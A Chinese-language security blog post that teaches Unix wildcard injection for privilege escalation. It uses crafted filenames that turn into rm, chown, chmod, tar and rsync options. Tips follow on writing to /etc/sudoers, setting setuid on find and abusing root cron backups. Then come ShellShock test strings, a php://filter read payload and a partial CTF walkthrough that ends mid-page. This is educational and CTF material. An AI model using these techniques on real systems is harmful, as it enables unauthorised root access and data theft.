<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content=" ​	文章首发于先知社区：https://xz.aliyun.com/t/4309
 之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。
"><title>命令执行到提权</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="命令执行到提权">
<meta property="og:description" content=" ​	文章首发于先知社区：https://xz.aliyun.com/t/4309
 之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="Sec"><meta property="article:tag" content="RCE"><meta property="article:published_time" content="2019-03-12T13:44:47+00:00"><meta property="article:modified_time" content="2019-03-12T13:44:47+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="命令执行到提权">
<meta name=twitter:description content=" ​	文章首发于先知社区：https://xz.aliyun.com/t/4309
 之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/Sec/ style=background-color:#0b0;color:#fff>
Sec
</a>
</header>
<h2 class=article-title>
<a href=/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>命令执行到提权</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Mar 12, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
15 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<blockquote>
<p>​ 文章首发于先知社区：https://xz.aliyun.com/t/4309</p>
</blockquote>
<p>之前在补天平台首发了<a class=link href=https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw target=_blank rel=noopener>巧用命令注入的N种方式</a>，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。</p>
<p>[TOC]</p>
<h2 id=提权>提权</h2>
<p>这里我们讲讲在命令注入中更有意思的一种方法。</p>
<h3 id=wildcard-wilderness>Wildcard Wilderness</h3>
<h4 id=example-1>Example 1</h4>
<p>首先我们先看一个示例</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=s2>&#34;Hello Friends&#34;</span> &gt; file1
<span class=nb>echo</span> <span class=s2>&#34;This is wildcard Injection&#34;</span> &gt;file2
<span class=nb>echo</span> <span class=s2>&#34;take help&#34;</span> &gt; --help
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg loading=lazy>
</a>
</figure></p>
<p>首先创建几个文件，其中有一个是<code>--help</code>，然后使用<code>cat</code>命令读取文件内容</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat file1
cat file <span class=m>2</span>
cat --help
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg loading=lazy>
</a>
</figure></p>
<p>如果按照我们预期的，是不是在第三个<code>cat --help</code>处应该是要读取<code>—help</code>文件的内容呢？然而我们执行<code>cat —help</code>却优先执行了<code>cat</code>命令的帮助选项，并没有读出<code>—help</code>里的内容。</p>
<p>不仅是<code>cat</code>，<code>ls</code>等命令也会优先调用内置<code>--help</code>选项。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg loading=lazy>
</a>
</figure></p>
<p>以及还有<code>--all</code>选项。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg loading=lazy>
</a>
</figure></p>
<p>其实讲道理，词法分析把对诸如<code>--help</code>、<code>--all</code>等选项优先处理为内置选项输出，看起来并没有任何问题</p>
<p>这个技巧叫做<code>Wildcard wildness</code>，中文有人译为通配符在野。(<code>-all</code>、<code>--help</code>可以通过加入<code>./</code>成<code>./-all</code>、<code>./--help</code>来特指这个文件，避免这个问题)</p>
<h4 id=example-2>Example 2</h4>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg loading=lazy>
</a>
</figure></p>
<p>如图，我们有两个文件，当用<code>rm *</code>的时候，只删掉了<code>file1</code>与<code>file2</code>，并没有删除<code>*</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg loading=lazy>
</a>
</figure></p>
<p>或者使用<code>rm file1 file2 -rf</code>逐个删除之时，也只删掉了<code>file1</code>与<code>file2</code></p>
<p>使用<code>strace rm *</code>我们可以发现</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg loading=lazy>
</a>
</figure></p>
<p>由于当前目录中存在<code>-rf</code>文件名，<code>rm</code>将<code>-rf</code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上<code>./-rf</code>进行删除</p>
<h3 id=trick>Trick</h3>
<p>我们可以利用<code>Wildcard Wilderness</code>做一些更有用的事情。</p>
<h4 id=file-owner-hijacking>File Owner Hijacking</h4>
<p>现在我们有三个用户，一个<code>zedd</code>，一个<code>test</code>，一个<code>root</code>用户。</p>
<p>我们分别用<code>zedd</code>与<code>test</code>创建了不同的文件，<code>1.php</code>与<code>test.php</code>都属于<code>test</code>用户的文件，<code>zedd.php</code>与<code>--reference=zedd.php</code>均属于<code>zedd</code>用户的文件。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg loading=lazy>
</a>
</figure></p>
<p>然后使用<code>root</code>用户使用<code>chown -R test:test *.php</code>命令，想把本目录下所有的<code>.php</code>文件修改为<code>test</code>用户所有。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg loading=lazy>
</a>
</figure></p>
<p>但是结果我们可以发现，结果该目录下所有的<code>.php</code>文件都被修改为了<code>zedd</code>用户所有，成功“提权”。</p>
<p>原理我们可以用<code>strace chown -R zedd:zedd *.php</code>来看一下（注意这里换了一下，模拟想把<code>.php</code>文件改变成<code>zedd</code>用户所有）</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg loading=lazy>
</a>
</figure></p>
<p>我们可以看到</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>execve<span class=o>(</span><span class=s2>&#34;/bin/chown&#34;</span>, <span class=o>[</span><span class=s2>&#34;chown&#34;</span>, <span class=s2>&#34;-R&#34;</span>, <span class=s2>&#34;zedd:zedd&#34;</span>, <span class=s2>&#34;config.php&#34;</span>, <span class=s2>&#34;index.php&#34;</span>, <span class=s2>&#34;--reference=.backdoor.php&#34;</span><span class=o>]</span>, 0x7ffe5b43b1e8 /* <span class=m>35</span> vars */<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</code></pre></div><p>跟我们上个例子原理其实一样，<code>--reference=.backdoor.php</code>被作为一个选项进行了处理，而</p>
<pre tabindex=0><code>--reference=RFILE  use RFILE's owner and group rather than
                         specifying OWNER:GROUP values
</code></pre><p><code>--reference=RFILE</code>这个选项则是使用<code>RFILE</code>的文件拥有者和用户组来改变文件属性，而不是使用传入的<code>OWNER:GROUP</code>参数。</p>
<p>因此，在这种情况下，<code>chown</code>的<code>--reference</code>选项将覆盖指定为<code>root</code>用户输入的参数<code>zedd:zedd</code>，把此目录中所有<code>.php</code>文件的所有者改变与<code>.backdoor.php</code>的所有者<code>test</code>。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg loading=lazy>
</a>
</figure></p>
<p>所以，按照这种方法，我们可以劫持<code>root</code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。</p>
<h4 id=chmod-file-reference>Chmod File Reference</h4>
<p>类似<code>chown</code>的还有一个命令<code>chmod</code>，它也有<code>--reference=RFIE</code>的选项</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>--reference<span class=o>=</span>RFILE  use RFILE<span class=err>&#39;</span>s mode instead of MODE values
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg loading=lazy>
</a>
</figure></p>
<p>与<code>chown</code>类似，因为有<code>--reference=.backdoor.php</code>的存在，在使用<code>chmod 000 *</code>的时候也会把劫持到与<code>.backdoor.php</code>文件权限一样的权限</p>
<h4 id=tar命令利用>Tar命令利用</h4>
<p>首先我们来看看<code>tar</code>命令帮助文档中的几个有意思的选项</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>--checkpoint<span class=o>[=</span>NUMBER<span class=o>]</span>  
	display progress messages every NUMBERth record <span class=o>(</span>default 10<span class=o>)</span>
--checkpoint-action<span class=o>=</span>ACTION   
	execute ACTION on each checkpoint
</code></pre></div><p>从帮助文档，我们大致可以从中理解到，<code>--checkpoint=1</code>可以用来显示信息，<code>--checkpoint-action=exec=sh shell.sh</code>可以用来执行命令</p>
<p>先尝试构建一个<code>shell.sh</code>脚本，内容为<code>/usr/bin/id</code>，以及文件名为<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>的文件，使用<code>tar -cf test.tar *</code>把当前目录下所有文件压缩到<code>test.tar</code>压缩包内</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg loading=lazy>
</a>
</figure></p>
<p>可见，<code>/usr/bin/id</code>已经被成功执行输出。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg loading=lazy>
</a>
</figure></p>
<p>与之前一样，<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>被作为选项处理</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg loading=lazy>
</a>
</figure></p>
<p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: <a class=link href=https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98 target=_blank rel=noopener>2018SWPUCTF-Web#信息再次发掘</a></p>
<h4 id=rsync命令利用>rsync命令利用</h4>
<p><code>rsync</code>命令可能比较少用，我们这里简单介绍一下</p>
<blockquote>
<p>NAME</p>
<p>​ rsync - a fast, versatile, remote (and local) file-copying tool</p>
</blockquote>
<p><code>rsync</code>命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。使用一个远程shell程序(如<a class=link href=http://man.linuxde.net/rsh target=_blank rel=noopener>rsh</a>、<a class=link href=http://man.linuxde.net/ssh target=_blank rel=noopener>ssh</a>)来实现将本地机器的内容拷贝到远程机器。如：<code>rsync -t *.c foo:src</code>，复制当前本地文件夹下的所有的<code>.c</code>文件到 foo 远程服务器的<code>/src</code>文件夹下。</p>
<p><code>rsync</code>帮助文档含有以下几个比较有意思的选项</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>-e, --rsh<span class=o>=</span>COMMAND           specify the remote shell to use
    --rsync-path<span class=o>=</span>PROGRAM    specify the rsync to run on remote machine
</code></pre></div><p><code>--rsh=COMMAND</code>又是一个我们可以利用的地方，我们首先创建一个文件名为<code>-e sh shell.c</code>的文件，然后再创建一个<code>shell.c</code>文件，污染<code>rsync</code>参数来实现执行我们在<code>shell.c</code>中写入的预期命令</p>
<p>假设当前目录下我们拥有一个只有<code>root</code>用户可读的<code>rootfile</code>文件，由于不能直接输出结果，我们可以构造<code>cat ./rootfile > ./output</code>，将文件内容读出。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg loading=lazy>
</a>
</figure></p>
<p>得到的<code>output</code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行<code>rsync</code>用户的权限，不是直接的<code>root</code>权限，这里因为执行命令的是<code>root</code>权限，所以能读取只有<code>root</code>用户才能读取的<code>rootfile</code>文件</p>
<h4 id=tips>Tips</h4>
<ul>
<li>
<p>既然能执行命令，其实我们可以参照上篇列举的反弹 shell 的方式将 shell 反弹给我们，也可以配合<code>msfvenom</code>来使用。</p>
</li>
<li>
<p><code>tar</code>命令比较多的都用在<code>/etc/crontab</code>计划任务中，经常会有管理员会用<code>crontab</code>来执行一些<code>tar</code>命令的备份操作，而且<code>crontab</code>执行的权限还是<code>root</code>权限，所以这是个很好利用的点</p>
</li>
<li>
<p><code>tar</code>命令需要进入到<code>--checkpoint=1</code>文件所在的目录内，如果加上绝对路径将会失效，例如<code>tar cf test.tar /var/www/html/*</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg loading=lazy>
</a>
</figure></p>
<p>我们可以看到 shell 处理方式将<code>/home/zedd/Desktop/test</code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了</p>
</li>
<li>
<p>还可以用<code>echo "zedd ALL=(root) NOPASSWD: ALL" > /etc/sudoers</code>，把自己直接写入管理员组</p>
</li>
<li>
<p>利用<code>chmod u+s /usr/bin/find</code>提升为<code>root</code>权限执行，配合<code>find</code>命令的<code>-exec COMMAND</code>来执行命令，例如<code>find f1 -exec "whoami" \;</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg loading=lazy>
</a>
</figure></p>
</li>
</ul>
<p>文章中讨论的技术可以以不同的形式在各种流行的Unix工具上应用，这里仅仅是抛砖引玉，列举一部分命令。 在实际攻击中，任意 shell 选项/参数都可以隐藏在常规文件中，管理员也不容易发现，比如使用<code>.backdoor.php</code>等形式。</p>
<h3 id=other>Other</h3>
<p>这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。</p>
<h4 id=echo>Echo</h4>
<p><code>echo *</code>可以用来显示目录，<code>echo /???g</code>可以用来探测文件</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg loading=lazy>
</a>
</figure></p>
<h4 id=ln>ln</h4>
<blockquote>
<p>NAME</p>
<p>​ ln - make links between files</p>
</blockquote>
<p><code>ln</code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考<a class=link href=https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html target=_blank rel=noopener>理解Linux硬链接与软链接</a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用<code>ln -s</code>创建</p>
<p>例如，这里我们根目录下有一个文件内容为<code>flag{xxx}</code>的名为<code>flag</code>文件，我们使用<code>ln -s /flag file</code>，在当前目录下创建一个<code>file</code>文件链接到<code>/flag</code>，使用<code>cat file</code>与<code>php -r "echo file_get_contents('file')" </code>均可以读取到<code>/flag</code>的内容。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg loading=lazy>
</a>
</figure></p>
<p>这个软链接读取文件内容已经被多次利用</p>
<ul>
<li>在 GitLab CVE-2016-9086 也是利用了这点，参考<a class=link href=https://paper.seebug.org/104/ target=_blank rel=noopener>GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞</a></li>
<li>CTF 中也出现了类似的题目，参考<a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>一个有趣的任意文件读取</a>，以及在 2018 年赛博地球杯上有一道题也是利用这个点，参考<a class=link href=https://cl0und.github.io/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/ target=_blank rel=noopener>记录一道题的多种解法</a>，<a class=link href="https://www.xctf.org.cn/library/details/cyberearth-writeup/?from=groupmessage&isappinstalled=0" target=_blank rel=noopener>“赛博地球杯”工业互联网安全大赛线上赛Writeup</a></li>
</ul>
<h4 id=shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</h4>
<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的 shell 命令，甚至完全控制目标系统，详细分析参考<a class=link href=https://www.freebuf.com/articles/system/45390.html target=_blank rel=noopener>破壳（ShellShock）漏洞样本分析报告</a></p>
<blockquote>
<ul>
<li>
<p>CVE-2014-6271 测试方式:</p>
<p>env x='() { :;}; echo vulnerable' bash -c &ldquo;echo this is a test&rdquo;</p>
</li>
<li>
<p>CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
env -i X=';() { (a)=>' bash -c &lsquo;echo date&rsquo;; cat echo</p>
</li>
</ul>
</blockquote>
<h4 id=从一道题看shell-shock>从一道题看Shell Shock</h4>
<p>题目地址：<a class=link href=https://command-executor.hackme.inndy.tw/index.php target=_blank rel=noopener>command-executor</a>——来源于 <a class=link href=https://hackme.inndy.tw target=_blank rel=noopener>HackMe</a></p>
<p>题目描述：</p>
<blockquote>
<p>​ Here&rsquo;s my useless developer assistant website, try to execute your own command!</p>
</blockquote>
<p>题目大体思路是：</p>
<ul>
<li>读取源码</li>
<li>Shell Shock命令执行</li>
<li>重定向读写文件</li>
</ul>
<p>题目设置为几个功能，一个<code>man</code>命令的帮助文档</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg loading=lazy>
</a>
</figure></p>
<p>选择了<code>ls</code>，多了个请求参数<code>file=ls</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg loading=lazy>
</a>
</figure></p>
<p>尝试用其他命令，比如<code>find</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg loading=lazy>
</a>
</figure></p>
<p>猜测<code>eval("man /bin/" + command)</code>或者一些其他的目录</p>
<p><code>Tar Tester</code>界面可以上传压缩包但是并没有解压，只是<code>tar -tvf test.tar</code>查看压缩包内的内容</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg loading=lazy>
</a>
</figure></p>
<p><code>Cmd Exec</code>界面只有两个命令，一个<code>ls</code>，一个<code>env</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg loading=lazy>
</a>
</figure></p>
<p><code>List files</code>是个目录列举界面，可以列举几个目录</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg loading=lazy>
</a>
</figure></p>
<p>观察题目，题目 url<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>等均带有<code>func=xxx</code>参数来展示页面，猜测会有文件包含漏洞，尝试使用<code>func=php://filter/read=convert.base64-encode/resource=index</code>读取文件内容，成功得到回显</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg loading=lazy>
</a>
</figure></p>
<p>解码得到 <code>index.php</code>源码</p>
<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
$pages = [
    ['man', 'Man'],
    ['untar', 'Tar Tester'],
    ['cmd', 'Cmd Exec'],
    ['ls', 'List files'],
];

function fuck($msg) {
    header('Content-Type: text/plain');
    echo $msg;
    exit;
}

$black_list = [
    '\/flag', '\(\)\s*\{\s*:;\s*\};'
];

function waf($a) {
    global $black_list;
    if(is_array($a)) {
        foreach($a as $key =&gt; $val) {
            waf($key);
            waf($val);
        }
    } else {
        foreach($black_list as $b) {
            if(preg_match(&quot;/$b/&quot;, $a) === 1) {
                fuck(&quot;$b detected! exit now.&quot;);
            }
        }
    }
}

waf($_SERVER);
waf($_GET);
waf($_POST);

function execute($cmd, $shell='bash') {
    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
}

foreach($_SERVER as $key =&gt; $val) {
    if(substr($key, 0, 5) === 'HTTP_') {
        putenv(&quot;$key=$val&quot;);
    }
}

$page = '';

if(isset($_GET['func'])) {
    $page = $_GET['func'];
    if(strstr($page, '..') !== false) {
        $page = '';
    }
}

if($page &amp;&amp; strlen($page) &gt; 0) {
    try {
        include(&quot;$page.php&quot;);
    } catch (Exception $e) {
    }
}

function render_default() { ?&gt;
&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;

&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;
&lt;?php }
?&gt;&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;Command Executor&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt;
    &lt;style&gt;
      nav { margin-bottom: 1rem; }
      img { max-width: 100%; }
    &lt;/style&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;
      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;

      &lt;ul class=&quot;navbar-nav&quot;&gt;
